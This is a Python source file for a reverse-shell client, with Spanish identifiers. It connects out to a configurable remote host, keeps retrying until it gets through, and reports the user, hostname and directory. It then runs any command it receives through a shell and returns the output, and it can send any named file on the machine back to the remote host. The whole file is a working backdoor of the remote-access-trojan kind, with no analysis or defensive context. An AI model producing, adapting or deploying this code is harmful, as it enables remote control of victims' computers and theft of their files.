import socket
import os
import getpass
import re
from time import sleep
from subprocess import Popen, PIPE

class TCP:
    def __init__(self, host, port):
        self.__host = host
        self.__port = port

    def conectar(self):
        while True:
            try:
                self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.__sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

                self.__sock.connect((self.__host, self.__port))
                self.__chunk = int(self.__sock.recv(1024).decode())

                sleep(0.05)
                userName = getpass.getuser()
                hostName = socket.gethostname()
                currentDir = os.getcwd()
                info = userName + '\n' + hostName + '\n' + currentDir
                self.__sock.send(info.encode())

                break

            except:
                sleep(5)

    def getNombre(self, ubicacion):
        nombre = os.path.abspath(ubicacion)
        nombre = os.path.basename(nombre)
        return nombre

    def enviarArchivo(self, ubicacion):
        sleep(0.1)
        tam = os.path.getsize(ubicacion)
        paquetes = str(int(tam/self.__chunk))
        self.__sock.send(paquetes.encode())

        sleep(0.1)
        with open(ubicacion, 'rb') as archivo:
            info = archivo.read(self.__chunk)
            while info:
                self.__sock.send(info)
                info = archivo.read(self.__chunk)
                sleep(0.05)
        archivo.close()

    def cd(self, directorio):
        if os.path.isdir(directorio):
            os.chdir(directorio)
            self.__sock.send(os.getcwd().encode())

        else:
            self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())

    def sendFileFrom(self, cmd):
        if re.search("-d", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]

            if os.path.isfile(origen):
                self.__sock.send("ok".encode())
                self.enviarArchivo(origen)

            else:
                self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())

        else:
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]

            if os.path.isfile(origen):
                self.__sock.send("ok".encode())
                nombre = self.getNombre(origen)

                sleep(0.05)
                self.__sock.send(nombre.encode())
                self.enviarArchivo(origen)

            else:
                self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())

    def shell(self):
        try:
            while True:
                cmd = self.__sock.recv(1024).decode()

                if cmd.lower() == "exit":
                    try:
                        self.__sock.close()
                        break

                    except:
                        continue

                elif cmd.lower() == 'q' or cmd.lower() == "quit":
                    try:
                        self.__sock.close()
                        self.conectar()

                    except:
                        continue

                elif cmd.lower()[:2] == "cd":
                    try:
                        self.cd(cmd[3:])

                    except:
                        continue

                elif cmd.lower()[:3] == "sff":
                    try:
                        self.sendFileFrom(cmd)

                    except:
                        continue

                else:
                    try:
                        comando = Popen(cmd, shell=PIPE, stdin=PIPE, stdout=PIPE, stderr=PIPE)
                        info = comando.stdout.read() + comando.stderr.read()

                        if info == b'':
                            self.__sock.send("[+] Comando ejecutado".encode())

                        else:
                            i = 0
                            while i < len(info):
                                self.__sock.send(info[i:i+self.__chunk])
                                i += self.__chunk

                    except:
                        continue

        except:
            self.conectar()
